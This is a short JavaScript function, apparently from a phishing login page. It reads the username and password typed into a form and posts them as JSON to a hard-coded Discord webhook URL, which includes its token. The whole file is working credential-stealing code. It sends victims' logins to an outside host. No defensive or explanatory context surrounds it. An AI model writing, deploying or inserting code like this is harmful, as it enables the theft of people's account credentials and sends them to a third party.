function password() {
    let username = document.getElementById("username").value;
    let password = document.getElementById("password").value;
     
    const webhook="https://discord.com/api/webhooks/1346150237823307807/aeawLgA7iKFJd66lsUORCd8rIfZ3iwRfz7DYauCzUwoBW1xWAvhqZekA79wI-2LqBVQz";
    
    const contents =`______________________\n Username: ${username}\n Password: ${password}\n ______________________`;
    const request = new XMLHttpRequest();
    request.open("post",webhook);
    request.setRequestHeader('Content-type','application/json');
    const parmas = {
    content: contents
    }
    
    request.send(JSON.stringify(parmas));
    
    
    
    
    
    }